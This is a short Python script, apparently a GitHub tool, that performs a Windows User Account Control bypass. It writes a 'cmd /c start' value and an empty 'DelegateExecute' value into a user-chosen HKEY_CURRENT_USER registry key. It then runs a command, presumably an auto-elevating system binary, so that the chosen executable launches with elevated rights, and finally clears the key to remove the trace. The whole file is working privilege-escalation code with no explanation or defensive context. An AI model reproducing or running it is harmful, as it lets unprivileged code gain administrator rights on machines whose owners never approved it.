from winreg import KEY_WRITE,SetValueEx,CloseKey,HKEY_CURRENT_USER,REG_SZ,OpenKey,CreateKey
from argparse import ArgumentParser
from os import system
from sys import exit
__author__="Vahab Programmer https://Github.com/Vahab-Programmer"
__version__="0.0.1"
def set_reg(addr,value)->None:
    CreateKey(HKEY_CURRENT_USER, addr)
    key = OpenKey(HKEY_CURRENT_USER, addr, 0, KEY_WRITE)
    SetValueEx(key, None, 0, REG_SZ, value)
    SetValueEx(key, "DelegateExecute", 0, REG_SZ, None)
    CloseKey(key)
parser=ArgumentParser()
parser.add_argument("exe")
parser.add_argument("regaddr")
parser.add_argument("command")
args=parser.parse_args()
set_reg(args.regaddr,f"cmd /c start {args.exe}")
system(args.command)
set_reg(args.regaddr,None)
exit(0)
